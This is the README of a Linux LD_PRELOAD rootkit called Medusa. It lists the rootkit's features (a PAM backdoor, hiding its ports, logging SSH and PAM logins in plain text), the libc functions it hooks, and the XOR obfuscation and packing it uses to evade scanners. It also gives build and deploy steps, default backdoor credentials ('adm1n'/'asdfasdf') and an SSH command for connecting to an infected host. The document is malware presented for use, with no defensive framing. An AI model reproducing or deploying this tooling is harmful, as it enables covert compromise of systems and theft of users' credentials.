![](https://files.catbox.moe/dzc09n.png)
### Description
Yet Another LD_PRELOAD Rootkit. **Medusa** is a usermode LD_PRELOAD rootkit for Linux systems x86 and x64, and is installed via ELF and is very cross-platform compatible. **Medusa** also uses **MidgetPacker** for packing the ELF to avoid scan-time detection. All strings, and rootkit configuration is "crypted" with XOR.

Testing working on **Debian**, **Ubuntu**, **CentOS 5.x**, **CentOS 6.x**, **CentOS 7.x**, **SUSE**, **Red Hat**, and more.

### Features

- PAM backdoor
- Hide all ports used by Medua
- Log all SSH and PAM authentications in plain-text

### LIBC Function Hooks

- stat
- xstat/xstat64
- lxstat/lxstat64
- lstat/lstat64
- fxstatat
- write
- read
- readdir
- opendir
- open
- fopen
- unlink
- execve
- getpwnam
- getpwnam_r
- setgid
- setregid
- setresgid
- access
- truncate
- chmod
- chown
- fchownat
- creat
- mkdir
- mkdirat
- unlinkat
- openat
- statfs
- statvfs
- ioctl
- hosts_access
- pututxline
- updwtmp
- pututline
- stat64
- prctl

#### Build And Deploy

Change the settings you want in **src/config.c** this includes your username and password that will be used to access the backdoor deployed by Medusa. 

**Default Backdoor Credentials:**
**Username**: adm1n
**Password**: asdfasdf

```ssh
make
```

The executable in **bin/rkload** is the deployable rootkit.

**Connect via SSH to backdoor:**
```ssh
ssh adm1n@infected-host.com
```
